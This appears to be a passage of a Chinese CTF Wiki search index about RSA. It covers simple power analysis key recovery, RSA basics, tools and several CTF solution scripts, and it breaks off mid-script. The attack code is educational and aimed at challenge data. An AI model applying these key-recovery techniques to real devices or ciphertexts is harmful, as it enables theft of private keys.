014b05e1a09668c83e13fda8be28d148568a2342aed833e0ad646bd45461da2decf9d538c2d3ab245b272873beb112586bb7b17dc4b30f0c5408d8b03cfbc8388b2bd579fb419a1cac38798da1c3da75dc9a74a90d98c8f986fd8ab8b2dc539768beb339cadc13383c62b5223a50e050cb9c6b759072962c2b2cf21b4421ca73394d9e12cfbc958fc5f6b596da368923121e55a3c6a7b12fdca127ecc0e8470463f6e04f27cd4bb3de30555b6c701f524c8c032fa51d719901e7c75cc72764ac00976ac6427a1f483779f61cee455ed319ee9071abefae4473e7c637760b4b3131f25e5eb9950dd9d37666e129640c82a4b01b8bdc1a78b007f8ec71e7bad48046 \u5206\u6790 \u00b6 \u7531\u4e8e\u7f51\u7ad9\u53ea\u7ed9\u51fa\u4e86\u4e00\u6761\u80fd\u91cf\u8ff9\uff0c\u6240\u4ee5\u53ef\u4ee5\u65ad\u5b9a\u8fd9\u662f Simple channel analysis\uff08SPA\uff09\u653b\u51fb\u3002\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u89c2\u5bdf\u80fd\u91cf\u8ff9\u7684\u9ad8\u4f4e\u7535\u5e73\u6765\u83b7\u5f97 RSA \u89e3\u5bc6\u8fc7\u7a0b\u7684\u5bc6\u94a5 d\u3002 RSA \u53ef\u88ab SPA \u653b\u51fb\u7684\u7406\u8bba\u57fa\u7840\u6765\u81ea\u4e8e RSA \u4e2d\u5305\u542b\u7684\u5feb\u901f\u5e42\u53d6\u4f59\u7b97\u6cd5\u3002 \u5feb\u901f\u5e42\u7b97\u6cd5\u5982\u4e0b b \u4e3a\u5076\u6570\u65f6\uff0c a^b \\bmod c = ({a^2}^{b/2}) \\bmod c a^b \\bmod c = ({a^2}^{b/2}) \\bmod c \u3002 b \u4e3a\u5947\u6570\u65f6\uff0c a^b \\bmod c = ({a^2}^{b/2} \\times a) \\bmod c a^b \\bmod c = ({a^2}^{b/2} \\times a) \\bmod c \u3002 \u76f8\u5e94\u7684 C \u4ee3\u7801\u5b9e\u73b0\u4e3a\uff1a int PowerMod ( int a , int b , int c ) { int ans = 1 ; a = a % c ; while ( b > 0 ) { if ( b % 2 == 1 ) // \u5f53b\u4e3a\u5947\u6570\u65f6\u4f1a\u591a\u6267\u884c\u4e0b\u9762\u7684\u6307\u4ee4 ans = ( ans * a ) % c ; b = b / 2 ; a = ( a * a ) % c ; } return ans ; } \u7531\u4e8e\u5feb\u901f\u5e42\u7684\u8ba1\u7b97\u8fc7\u7a0b\u4e2d\u4f1a\u9010\u4f4d\u5224\u65ad\u6307\u6570\u7684\u53d6\u503c\uff0c\u5e76\u4f1a\u91c7\u53d6\u4e0d\u540c\u7684\u64cd\u4f5c\uff0c\u6240\u4ee5\u53ef\u4ece\u80fd\u91cf\u8ff9\u4e2d\u8fd8\u539f\u51fa d \u7684\u53d6\u503c\uff08\u4ece\u4e0a\u9762\u53ef\u77e5\uff0c\u76f4\u63a5\u5f97\u5230\u7684\u503c\u662f d \u7684\u4e8c\u8fdb\u5236\u53d6\u503c\u7684 \u9006\u5e8f \uff09\u3002 \u6ce8\u610f \uff1a \u6709\u65f6\u5019\u6a21\u4e58\u4e5f\u53ef\u80fd\u4f1a\u4ece\u9ad8\u4f4d\u5411\u4f4e\u4f4d\u8fdb\u884c\u6a21\u4e58\u3002\u8fd9\u91cc\u662f\u4ece\u4f4e\u4f4d\u5411\u9ad8\u4f4d\u6a21\u4e58\u3002 \u7531\u6b64\u53ef\u7ed9\u51fa\u8fd8\u539f d \u7684\u811a\u672c\u5982\u4e0b\uff1a f = open ( './data.txt' ) data = f . read () . split ( \",\" ) print ( 'point number:' , len ( data )) start_point = 225 # \u5f00\u59cb\u5206\u6790\u7684\u70b9 mid = 50 # \u91c7\u6837\u70b9\u95f4\u9694 fence = 228 # \u9ad8\u4f4e\u7535\u5e73\u5206\u754c\u7ebf bin_array = [] for point_index in range ( start_point , len ( data ), mid ): if float ( data [ point_index ]) > fence : bin_array . append ( 1 ) else : bin_array . append ( 0 ) bin_array2 = [] flag1 = 0 flag2 = 0 for x in bin_array : if x : if flag1 : flag2 = 1 else : flag1 = 1 else : if flag2 : bin_array2 . append ( 1 ) else : bin_array2 . append ( 0 ) flag1 = 0 flag2 = 0 # d_bin = bin_array2[::-1] d_bin = bin_array2 d = \"\" . join ( str ( x ) for x in d_bin )[:: - 1 ] print ( d ) d_int = int ( d , 2 ) print ( d_int ) \u53c2\u8003\u8d44\u6599 \u00b6 Mangard, S., Oswald, E., Popp, T., \u51af\u767b\u56fd, \u5468\u6c38\u5f6c, & \u5218\u7ee7\u4e1a. (2010). \u80fd\u91cf\u5206\u6790\u653b\u51fb.","title":"\u4fa7\u4fe1\u9053\u653b\u51fb"},{"location":"crypto/asymmetric/rsa/rsa_side_channel/#rsa","text":"\u80fd\u91cf\u5206\u6790\u653b\u51fb\uff08\u4fa7\u4fe1\u9053\u653b\u51fb\uff09\u662f\u4e00\u79cd\u80fd\u591f\u4ece\u5bc6\u7801\u8bbe\u5907\u4e2d\u83b7\u53d6\u79d8\u5bc6\u4fe1\u606f\u7684\u5bc6\u7801\u653b\u51fb\u65b9\u6cd5\uff0e\u4e0e\u5176 \u4ed6\u653b\u51fb\u65b9\u6cd5\u4e0d\u540c\uff1a\u8fd9\u79cd\u653b\u51fb\u5229\u7528\u7684\u662f\u5bc6\u7801\u8bbe\u5907\u7684\u80fd\u91cf\u6d88\u8017\u7279\u5f81\uff0c\u800c\u975e\u5bc6\u7801\u7b97\u6cd5\u7684\u6570\u5b66\u7279\u6027\uff0e\u80fd\u91cf\u5206\u6790\u653b\u51fb\u662f\u4e00\u79cd\u975e\u5165\u4fb5\u5f0f\u653b\u51fb\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u65b9\u4fbf\u5730\u8d2d\u4e70\u5b9e\u65bd\u653b\u51fb\u6240\u9700\u8981\u7684\u8bbe\u5907\uff1a\u6240\u4ee5\u8fd9\u79cd\u653b\u51fb\u5bf9\u667a\u80fd\u5361\u4e4b\u7c7b\u7684\u5bc6\u7801\u8bbe\u5907\u7684\u5b89\u5168\u6027\u9020\u6210\u4e86\u4e25\u91cd\u5a01\u80c1\u3002 \u80fd\u91cf\u5206\u6790\u653b\u51fb\u662f\u5b89\u5168\u9886\u57df\u5185\u975e\u5e38\u91cd\u8981\u7684\u4e00\u4e2a\u90e8\u5206\uff0c\u6211\u4eec\u53ea\u5728\u8fd9\u91cc\u7b80\u5355\u8ba8\u8bba\u4e0b\u3002 \u80fd\u91cf\u5206\u6790\u653b\u51fb\u5206\u4e3a\uff1a - \u7b80\u5355\u80fd\u91cf\u5206\u6790\u653b\u51fb\uff08SPA\uff09\uff0c\u5373\u5bf9\u80fd\u91cf\u8ff9\u8fdb\u884c\u76f4\u89c2\u5206\u6790\uff0c\u8089\u773c\u770b\u5373\u53ef\u3002 - \u5dee\u5206\u80fd\u91cf\u5206\u6790\u653b\u51fb\uff08DPA\uff09\uff0c\u57fa\u4e8e\u80fd\u91cf\u8ff9\u4e4b\u95f4\u7684\u76f8\u5173\u7cfb\u6570\u8fdb\u884c\u5206\u6790\u3002","title":"RSA \u4fa7\u4fe1\u9053\u653b\u51fb"},{"location":"crypto/asymmetric/rsa/rsa_side_channel/#_1","text":"\u653b\u51fb\u8005\u53ef\u83b7\u53d6\u4e0e\u52a0\u89e3\u5bc6\u76f8\u5173\u7684\u4fa7\u4fe1\u9053\u4fe1\u606f\uff0c\u4f8b\u5982\u80fd\u91cf\u6d88\u8017\u3001\u8fd0\u7b97\u65f6\u95f4\u3001\u7535\u78c1\u8f90\u5c04\u7b49\u7b49\u3002","title":"\u653b\u51fb\u6761\u4ef6"},{"location":"crypto/asymmetric/rsa/rsa_side_channel/#_2","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 HITB 2017 \u7684 Hack in the card I \u4f5c\u4e3a\u4f8b\u5b50\u3002 \u9898\u76ee\u7ed9\u51fa\u4e86\u516c\u94a5\u6587\u4ef6 publickey.pem \uff0c\u5bc6\u6587\uff0c\u6d4b\u91cf\u667a\u80fd\u5361\u529f\u7387\u7684\u7535\u8def\u56fe\uff0c\u548c \u89e3\u5bc6 \u8fc7\u7a0b\u4e2d\u667a\u80fd\u5361\u6d88\u8017\u7684\u529f\u7387\u53d8\u5316\uff08\u901a\u8fc7\u5728\u7ebf\u7f51\u7ad9\u7ed9\u51fa trace \uff09\u3002 \u200b \u5bc6\u6587\uff1a 014b05e1a09668c83e13fda8be28d148568a2342aed833e0ad646bd45461da2decf9d538c2d3ab245b272873beb112586bb7b17dc4b30f0c5408d8b03cfbc8388b2bd579fb419a1cac38798da1c3da75dc9a74a90d98c8f986fd8ab8b2dc539768beb339cadc13383c62b5223a50e050cb9c6b759072962c2b2cf21b4421ca73394d9e12cfbc958fc5f6b596da368923121e55a3c6a7b12fdca127ecc0e8470463f6e04f27cd4bb3de30555b6c701f524c8c032fa51d719901e7c75cc72764ac00976ac6427a1f483779f61cee455ed319ee9071abefae4473e7c637760b4b3131f25e5eb9950dd9d37666e129640c82a4b01b8bdc1a78b007f8ec71e7bad48046","title":"\u4f8b\u5b50"},{"location":"crypto/asymmetric/rsa/rsa_side_channel/#_3","text":"\u7531\u4e8e\u7f51\u7ad9\u53ea\u7ed9\u51fa\u4e86\u4e00\u6761\u80fd\u91cf\u8ff9\uff0c\u6240\u4ee5\u53ef\u4ee5\u65ad\u5b9a\u8fd9\u662f Simple channel analysis\uff08SPA\uff09\u653b\u51fb\u3002\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u89c2\u5bdf\u80fd\u91cf\u8ff9\u7684\u9ad8\u4f4e\u7535\u5e73\u6765\u83b7\u5f97 RSA \u89e3\u5bc6\u8fc7\u7a0b\u7684\u5bc6\u94a5 d\u3002 RSA \u53ef\u88ab SPA \u653b\u51fb\u7684\u7406\u8bba\u57fa\u7840\u6765\u81ea\u4e8e RSA \u4e2d\u5305\u542b\u7684\u5feb\u901f\u5e42\u53d6\u4f59\u7b97\u6cd5\u3002 \u5feb\u901f\u5e42\u7b97\u6cd5\u5982\u4e0b b \u4e3a\u5076\u6570\u65f6\uff0c a^b \\bmod c = ({a^2}^{b/2}) \\bmod c a^b \\bmod c = ({a^2}^{b/2}) \\bmod c \u3002 b \u4e3a\u5947\u6570\u65f6\uff0c a^b \\bmod c = ({a^2}^{b/2} \\times a) \\bmod c a^b \\bmod c = ({a^2}^{b/2} \\times a) \\bmod c \u3002 \u76f8\u5e94\u7684 C \u4ee3\u7801\u5b9e\u73b0\u4e3a\uff1a int PowerMod ( int a , int b , int c ) { int ans = 1 ; a = a % c ; while ( b > 0 ) { if ( b % 2 == 1 ) // \u5f53b\u4e3a\u5947\u6570\u65f6\u4f1a\u591a\u6267\u884c\u4e0b\u9762\u7684\u6307\u4ee4 ans = ( ans * a ) % c ; b = b / 2 ; a = ( a * a ) % c ; } return ans ; } \u7531\u4e8e\u5feb\u901f\u5e42\u7684\u8ba1\u7b97\u8fc7\u7a0b\u4e2d\u4f1a\u9010\u4f4d\u5224\u65ad\u6307\u6570\u7684\u53d6\u503c\uff0c\u5e76\u4f1a\u91c7\u53d6\u4e0d\u540c\u7684\u64cd\u4f5c\uff0c\u6240\u4ee5\u53ef\u4ece\u80fd\u91cf\u8ff9\u4e2d\u8fd8\u539f\u51fa d \u7684\u53d6\u503c\uff08\u4ece\u4e0a\u9762\u53ef\u77e5\uff0c\u76f4\u63a5\u5f97\u5230\u7684\u503c\u662f d \u7684\u4e8c\u8fdb\u5236\u53d6\u503c\u7684 \u9006\u5e8f \uff09\u3002 \u6ce8\u610f \uff1a \u6709\u65f6\u5019\u6a21\u4e58\u4e5f\u53ef\u80fd\u4f1a\u4ece\u9ad8\u4f4d\u5411\u4f4e\u4f4d\u8fdb\u884c\u6a21\u4e58\u3002\u8fd9\u91cc\u662f\u4ece\u4f4e\u4f4d\u5411\u9ad8\u4f4d\u6a21\u4e58\u3002 \u7531\u6b64\u53ef\u7ed9\u51fa\u8fd8\u539f d \u7684\u811a\u672c\u5982\u4e0b\uff1a f = open ( './data.txt' ) data = f . read () . split ( \",\" ) print ( 'point number:' , len ( data )) start_point = 225 # \u5f00\u59cb\u5206\u6790\u7684\u70b9 mid = 50 # \u91c7\u6837\u70b9\u95f4\u9694 fence = 228 # \u9ad8\u4f4e\u7535\u5e73\u5206\u754c\u7ebf bin_array = [] for point_index in range ( start_point , len ( data ), mid ): if float ( data [ point_index ]) > fence : bin_array . append ( 1 ) else : bin_array . append ( 0 ) bin_array2 = [] flag1 = 0 flag2 = 0 for x in bin_array : if x : if flag1 : flag2 = 1 else : flag1 = 1 else : if flag2 : bin_array2 . append ( 1 ) else : bin_array2 . append ( 0 ) flag1 = 0 flag2 = 0 # d_bin = bin_array2[::-1] d_bin = bin_array2 d = \"\" . join ( str ( x ) for x in d_bin )[:: - 1 ] print ( d ) d_int = int ( d , 2 ) print ( d_int )","title":"\u5206\u6790"},{"location":"crypto/asymmetric/rsa/rsa_side_channel/#_4","text":"Mangard, S., Oswald, E., Popp, T., \u51af\u767b\u56fd, \u5468\u6c38\u5f6c, & \u5218\u7ee7\u4e1a. (2010). \u80fd\u91cf\u5206\u6790\u653b\u51fb.","title":"\u53c2\u8003\u8d44\u6599"},{"location":"crypto/asymmetric/rsa/rsa_theory/","text":"RSA \u4ecb\u7ecd \u00b6 RSA \u52a0\u5bc6\u7b97\u6cd5\u662f\u4e00\u79cd\u975e\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5\u3002\u5728\u516c\u5f00\u5bc6\u94a5\u52a0\u5bc6\u548c\u7535\u5b50\u5546\u4e1a\u4e2d RSA \u88ab\u5e7f\u6cdb\u4f7f\u7528\u3002RSA \u662f 1977 \u5e74\u7531\u7f57\u7eb3\u5fb7\u00b7\u674e\u7ef4\u65af\u7279\uff08Ron Rivest\uff09\u3001\u963f\u8fea\u00b7\u8428\u83ab\u5c14\uff08Adi Shamir\uff09\u548c\u4f26\u7eb3\u5fb7\u00b7\u963f\u5fb7\u66fc\uff08Leonard Adleman\uff09\u4e00\u8d77\u63d0\u51fa\u7684\u3002RSA \u5c31\u662f\u4ed6\u4eec\u4e09\u4eba\u59d3\u6c0f\u5f00\u5934\u5b57\u6bcd\u62fc\u5728\u4e00\u8d77\u7ec4\u6210\u7684\u3002 RSA \u7b97\u6cd5\u7684\u53ef\u9760\u6027\u7531\u6781\u5927\u6574\u6570\u56e0\u6570\u5206\u89e3\u7684\u96be\u5ea6\u51b3\u5b9a\u3002\u6362\u8a00\u4e4b\uff0c\u5bf9\u4e00\u6781\u5927\u6574\u6570\u505a\u56e0\u6570\u5206\u89e3\u6108\u56f0\u96be\uff0cRSA \u7b97\u6cd5\u6108\u53ef\u9760\u3002\u5047\u5982\u6709\u4eba\u627e\u5230\u4e00\u79cd\u5feb\u901f\u56e0\u6570\u5206\u89e3\u7684\u7b97\u6cd5\u7684\u8bdd\uff0c\u90a3\u4e48\u7528 RSA \u52a0\u5bc6\u7684\u4fe1\u606f\u7684\u53ef\u9760\u6027\u5c31\u80af\u5b9a\u4f1a\u6781\u5ea6\u4e0b\u964d\u3002\u4f46\u627e\u5230\u8fd9\u6837\u7684\u7b97\u6cd5\u7684\u53ef\u80fd\u6027\u662f\u975e\u5e38\u5c0f\u7684\u3002\u5982\u4eca\uff0c\u53ea\u6709\u77ed\u7684 RSA \u5bc6\u94a5\u624d\u53ef\u80fd\u88ab\u5f3a\u529b\u65b9\u5f0f\u89e3\u7834\u3002\u5230 2017 \u5e74\u4e3a\u6b62\uff0c\u8fd8\u6ca1\u6709\u4efb\u4f55\u53ef\u9760\u7684\u653b\u51fb RSA \u7b97\u6cd5\u7684\u65b9\u5f0f\u3002 \u57fa\u672c\u539f\u7406 \u00b6 \u516c\u94a5\u4e0e\u79c1\u94a5\u7684\u4ea7\u751f \u00b6 \u968f\u673a\u9009\u62e9\u4e24\u4e2a\u4e0d\u540c\u5927\u8d28\u6570 p p \u548c q q \uff0c\u8ba1\u7b97 N = p \\times q N = p \\times q \u6839\u636e\u6b27\u62c9\u51fd\u6570\uff0c\u6c42\u5f97 r=\\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1) r=\\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1) \u9009\u62e9\u4e00\u4e2a\u5c0f\u4e8e r r \u7684\u6574\u6570 e e \uff0c\u4f7f e e \u548c r r \u4e92\u8d28\u3002\u5e76\u6c42\u5f97 e e \u5173\u4e8e r r \u7684\u6a21\u53cd\u5143\u7d20\uff0c\u547d\u540d\u4e3a d d \uff0c\u6709 ed\\equiv 1 \\pmod r ed\\equiv 1 \\pmod r \u5c06 p p \u548c q q \u7684\u8bb0\u5f55\u9500\u6bc1 \u6b64\u65f6\uff0c (N,e) (N,e) \u662f\u516c\u94a5\uff0c (N,d) (N,d) \u662f\u79c1\u94a5\u3002 \u6d88\u606f\u52a0\u5bc6 \u00b6 \u9996\u5148\u9700\u8981\u5c06\u6d88\u606f m m \u4ee5\u4e00\u4e2a\u53cc\u65b9\u7ea6\u5b9a\u597d\u7684\u683c\u5f0f\u8f6c\u5316\u4e3a\u4e00\u4e2a\u5c0f\u4e8e N N \uff0c\u4e14\u4e0e N N \u4e92\u8d28\u7684\u6574\u6570 n n \u3002\u5982\u679c\u6d88\u606f\u592a\u957f\uff0c\u53ef\u4ee5\u5c06\u6d88\u606f\u5206\u4e3a\u51e0\u6bb5\uff0c\u8fd9\u4e5f\u5c31\u662f\u6211\u4eec\u6240\u8bf4\u7684\u5757\u52a0\u5bc6\uff0c\u540e\u5bf9\u4e8e\u6bcf\u4e00\u90e8\u5206\u5229\u7528\u5982\u4e0b\u516c\u5f0f\u52a0\u5bc6\uff1a n^{e}\\equiv c\\pmod N n^{e}\\equiv c\\pmod N \u6d88\u606f\u89e3\u5bc6 \u00b6 \u5229\u7528\u5bc6\u94a5 d d \u8fdb\u884c\u89e3\u5bc6\u3002 c^{d}\\equiv n\\pmod N c^{d}\\equiv n\\pmod N \u6b63\u786e\u6027\u8bc1\u660e \u00b6 \u5373\u6211\u4eec\u8981\u8bc1 n^{ed} \\equiv n \\bmod N n^{ed} \\equiv n \\bmod N \uff0c\u5df2\u77e5 ed \\equiv 1 \\bmod \\phi(N) ed \\equiv 1 \\bmod \\phi(N) \uff0c\u90a3\u4e48 ed=k\\phi(N)+1 ed=k\\phi(N)+1 \uff0c\u5373\u9700\u8981\u8bc1\u660e n^{k\\phi(N)+1} \\equiv n \\bmod N n^{k\\phi(N)+1} \\equiv n \\bmod N \u8fd9\u91cc\u6211\u4eec\u5206\u4e24\u79cd\u60c5\u51b5\u8bc1\u660e \u7b2c\u4e00\u79cd\u60c5\u51b5 gcd(n,N)=1 gcd(n,N)=1 \uff0c\u90a3\u4e48 n^{\\phi(N)} \\equiv 1 \\bmod N n^{\\phi(N)} \\equiv 1 \\bmod N \uff0c\u56e0\u6b64\u539f\u5f0f\u6210\u7acb\u3002 \u7b2c\u4e8c\u79cd\u60c5\u51b5 gcd(n,N)!=1 gcd(n,N)!=1 \uff0c\u90a3\u4e48 n \u5fc5\u7136\u662f p \u6216\u8005 q \u7684\u500d\u6570\uff0c\u5e76\u4e14 n \u5c0f\u4e8e N\u3002\u6211\u4eec\u5047\u8bbe n=xp n=xp \u90a3\u4e48 x \u5fc5\u7136\u5c0f\u4e8e q\uff0c\u53c8\u7531\u4e8e q \u662f\u7d20\u6570\u3002\u90a3\u4e48 n^{\\phi(q)} \\equiv 1 \\bmod q n^{\\phi(q)} \\equiv 1 \\bmod q \u8fdb\u800c n^{k\\phi(N)}=n^{k(p-1)(q-1)}=(n^{\\phi(q)})^{k(p-1)} \\equiv 1 \\bmod q n^{k\\phi(N)}=n^{k(p-1)(q-1)}=(n^{\\phi(q)})^{k(p-1)} \\equiv 1 \\bmod q \u90a3\u4e48 n^{k\\phi(N)+1}=n+uqn n^{k\\phi(N)+1}=n+uqn \u8fdb\u800c n^{k\\phi(N)+1}=n+uqxp=n+uxN n^{k\\phi(N)+1}=n+uqxp=n+uxN \u6240\u4ee5\u539f\u5f0f\u6210\u7acb\u3002 \u57fa\u672c\u5de5\u5177 \u00b6 RSAtool \u00b6 \u5b89\u88c5 git clone https://github.com/ius/rsatool.git cd rsatool python rsatool.py -h \u751f\u6210\u79c1\u94a5 python rsatool.py -f PEM -o private.pem -p 1234567 -q 7654321 RSA Converter \u00b6 \u6839\u636e\u7ed9\u5b9a\u5bc6\u94a5\u5bf9\uff0c\u751f\u6210 pem \u6587\u4ef6 \u6839\u636e n\uff0ce\uff0cd \u5f97\u51fa p\uff0cq openssl \u00b6 \u67e5\u770b\u516c\u94a5\u6587\u4ef6 openssl rsa -pubin -in pubkey.pem -text -modulus \u89e3\u5bc6 rsautl -decrypt -inkey private.pem -in flag.enc -out flag \u66f4\u52a0\u5177\u4f53\u7684\u7ec6\u8282\u8bf7\u53c2\u8003 openssl --help \u3002 \u5206\u89e3\u6574\u6570\u5de5\u5177 \u00b6 \u7f51\u7ad9\u5206\u89e3\uff0c factor.db \u547d\u4ee4\u884c\u5206\u89e3\uff0c factordb-pycli \uff0c\u501f\u7528 factordb \u6570\u636e\u5e93\u3002 yafu python \u5e93 \u00b6 primefac \u00b6 \u6574\u6570\u5206\u89e3\u5e93\uff0c\u5305\u542b\u4e86\u5f88\u591a\u6574\u6570\u5206\u89e3\u7684\u7b97\u6cd5\u3002 gmpy \u00b6 gmpy.root(a, b) \uff0c\u8fd4\u56de\u4e00\u4e2a\u5143\u7ec4 (x, y) \uff0c\u5176\u4e2d x \u4e3a a \u5f00 b \u6b21\u65b9\u7684\u503c\uff0c y \u662f\u5224\u65ad x \u662f\u5426\u4e3a\u6574\u6570\u7684\u5e03\u5c14\u578b\u53d8\u91cf gmpy2 \u00b6 \u5b89\u88c5\u65f6\uff0c\u53ef\u80fd\u4f1a\u9700\u8981\u81ea\u5df1\u53e6\u884c\u5b89\u88c5 mfpr \u4e0e mpc \u5e93\u3002 gmpy2.iroot(a, b) \uff0c\u7c7b\u4f3c\u4e8e gmpy.root(a,b) pycrypto \u00b6 \u5b89\u88c5 sudo pip install pycrypto \u4f7f\u7528 import gmpy from Crypto.Util.number import * from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 msg = 'crypto here' p = getPrime ( 128 ) q = getPrime ( 128 ) n = p * q e = getPrime ( 64 ) pubkey = RSA . construct (( long ( n ), long ( e ))) privatekey = RSA . construct (( long ( n ), long ( e ), long ( d ), long ( p ), long ( q ))) key = PKCS1_v1_5 . new ( pubkey ) enc = key . encrypt ( msg ) . encode ( 'base64' ) key = PKCS1_v1_5 . new ( privatekey ) msg = key . decrypt ( enc . decode ( 'base64' ), e ) Jarvis OJ - Basic - veryeasyRSA \u00b6 p = 3487583947589437589237958723892346254777 q = 8767867843568934765983476584376578389 e = 65537 \u6c42 d = \u8bf7\u63d0\u4ea4 PCTF{d} \u76f4\u63a5\u6839\u636e ed\\equiv 1 \\pmod r ed\\equiv 1 \\pmod r \uff0c\u5176\u4e2d r=\\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1) r=\\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1) \uff0c\u53ef\u5f97 d\u3002 import gmpy2 p = 3487583947589437589237958723892346254777 q = 8767867843568934765983476584376578389 e = 65537 phin = ( p - 1 ) * ( q - 1 ) print gmpy2 . invert ( e , phin ) \u279c Jarvis OJ-Basic-veryeasyRSA git: ( master ) \u2717 python exp.py 19178568796155560423675975774142829153827883709027717723363077606260717434369 2018 CodeGate CTF Rsababy \u00b6 \u7a0b\u5e8f\u5c31\u662f\u4e00\u4e2a\u7b80\u5355\u7684 RSA\uff0c\u4e0d\u8fc7\u7a0b\u5e8f\u8fd8\u751f\u6210\u4e86\u4e24\u4e2a\u5947\u602a\u7684\u6570 e = 65537 n = p * q pi_n = ( p - 1 ) * ( q - 1 ) d = mulinv ( e , pi_n ) h = ( d + p ) ^ ( d - p ) g = d * ( p - 0xdeadbeef ) \u6240\u4ee5\uff0c\u95ee\u9898\u5e94\u8be5\u51fa\u81ea\u8fd9\u91cc\uff0c\u6240\u4ee5\u6211\u4eec\u5c31\u4ece\u6b64\u4e0b\u624b\uff0c\u4e0d\u653e\u8fd9\u91cc\u5148\u5047\u8bbe const = 0xdeadbeef \u3002\u90a3\u4e48 eg = ed*(p-const) eg = ed*(p-const) \u8fdb\u800c\uff0c\u6839\u636e RSA \u53ef\u77e5 2^{eg}=2^{ed*(p-const)}=2^{p-const} \\pmod n 2^{eg}=2^{ed*(p-const)}=2^{p-const} \\pmod n 2^{p-const}*2^{const-1} = 2^{p-1} \\pmod n 2^{p-const}*2^{const-1} = 2^{p-1} \\pmod n \u6240\u4ee5 2^{p-1} = 2^{eg}*2^{const-1}+kn 2^{p-1} = 2^{eg}*2^{const-1}+kn \u800c\u4e0e\u6b64\u540c\u65f6\u6839\u636e\u8d39\u9a6c\u5c0f\u5b9a\u7406\uff0c\u6211\u4eec\u77e5\u9053 2^{p-1} \\equiv 1 \\pmod p 2^{p-1} \\equiv 1 \\pmod p \u6240\u4ee5 p|2^{p-1}-1 | 2^{eg+const-1}-1+kn p|2^{p-1}-1 | 2^{eg+const-1}-1+kn \u8fdb\u800c p|2^{eg+const-1}-1 p|2^{eg+const-1}-1 \u6240\u4ee5 p|gcd(2^{eg+const-1}-1,n) p|gcd(2^{eg+const-1}-1,n) \u56e0\u6b64\uff0c\u4ee3\u7801\u5982\u4e0b tmp = gmpy2 . powmod ( 2 , e * g + const - 1 , n ) - 1 p = gmpy2 . gcd ( tmp , n ) q = n / p phin = ( p - 1 ) * ( q - 1 ) d = gmpy2 . invert ( e , phin ) plain = gmpy2 . powmod ( data , d , n ) print hex ( plain )[ 2 :] . decode ( 'hex' ) 2018 \u56fd\u5bb6\u5b89\u5168\u5468 pure math \u00b6 \u9898\u76ee\u7684\u57fa\u672c\u63cf\u8ff0\u662f\u8fd9\u4e2a\u6837\u5b50\u7684 1) p ** p % q = 1137973316343089029387365135250835133803975869258714714790597743585251681751361684698632609164883988455302237641489036138661596754239799122081528662395492 2) q ** q % p = 6901383184477756324584651464895743132603115552606852729050186289748558760692261058141015199261946483809004373728135568483701274908717004197776113227815323 3) (p ** q + q ** p) % (p*q) = 16791287391494893024031688699360885996180880807427715700800644759680986120242383930558410147341340225420991368114858791447699399702390358184412301644459406 4) (p+q) ** (p+q) % (p*q) = 63112211860889153729003401381621068190906433969243079543438386686621389392583849748240273643614258173423474299387234175508649197780206757067354426424570586101908571600743792328163163458500138799976944702155779196849585083397395750018148652864158388247163109077215394538930498877175474225571393901460434679279 5) FLAG ** 31337 % (p*q) = 6931243291746179589612148118911670244427928875888377273917973305632621316868302667641610838193899081089153471883271406133321321416064760200919958612671379845738048938060512995550639898688604592620908415248701721672948126507753670027043162669545932921683579001870526727737212722417683610956855529996310258030 Now, what\u2019s the FLAG??? \u6211\u4eec\u7684\u76ee\u7684\u57fa\u672c\u4e0a\u5c31\u662f\u6c42\u5f97 Flag\uff0c\u90a3\u4e48\u600e\u4e48\u505a\u5462?\u8fd9\u4e2a\u9898\u76ee\u9700\u8981\u6211\u4eec\u5177\u6709\u8f83\u597d\u7684\u6570\u8bba\u529f\u5e95\u3002 \u6839\u636e\u9898\u76ee\u4e2d\u8fd9\u6837\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u53ef\u4ee5\u5047\u8bbe p\uff0cq \u90fd\u662f\u5927\u7d20\u6570\uff0c\u90a3\u4e48 p^{q-1} \\equiv 1\\bmod q p^{q-1} \\equiv 1\\bmod q \u90a3\u4e48 p^{q} \\equiv p \\bmod pq p^{q} \\equiv p \\bmod pq \u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u6839\u636e 3 \u77e5\u9053 p^q+q^p \\equiv p+q \\bmod pq p^q+q^p \\equiv p+q \\bmod pq \u800c p+q \u53c8\u663e\u7136\u5c0f\u4e8e pq\uff0c\u6240\u4ee5\u6211\u4eec\u5c31\u77e5\u9053 p+q \u7684\u6570\u503c\u3002 \u8fdb\u4e00\u6b65\uff0c\u6211\u4eec\u5047\u8bbe1\uff0c2\uff0c3\uff0c4\uff0c5\u5bf9\u5e94\u7684\u503c\u5206\u522b\u4e3ax1~x5\u5219 \u6839\u636e4\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053 (p+q)^{p+q} \\equiv p^{p+q}+q^{p+q} \\bmod pq (p+q)^{p+q} \\equiv p^{p+q}+q^{p+q} \\bmod pq \u53c8\u56e0\u4e3a 1 \u548c 2\uff0c\u5219 p^pp \\equiv px_1\\bmod pq p^pp \\equiv px_1\\bmod pq q^qq \\equiv qx_2 \\bmod pq q^qq \\equiv qx_2 \\bmod pq \u56e0\u6b64 px_1+qx_2 \\equiv x_4 \\bmod pq px_1+qx_2 \\equiv x_4 \\bmod pq \u6839\u636e x1 \u548c x2 \u7684\u6c42\u5f97\u65b9\u5f0f\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u8fd9\u91cc\u4e5f\u662f\u7b49\u53f7\uff0c\u56e0\u6b64\u6211\u4eec\u5f97\u5230\u4e86\u4e00\u4e2a\u4e8c\u5143\u4e00\u6b21\u65b9\u7a0b\u7ec4\uff0c\u76f4\u63a5\u6c42\u89e3\u5373\u53ef\u3002 import gmpy2 x1 = 1137973316343089029387365135250835133803975869258714714790597743585251681751361684698632609164883988455302237641489036138661596754239799122081528662395492 x2 = 6901383184477756324584651464895743132603115552606852729050186289748558760692261058141015199261946483809004373728135568483701274908717004197776113227815323 p_q = 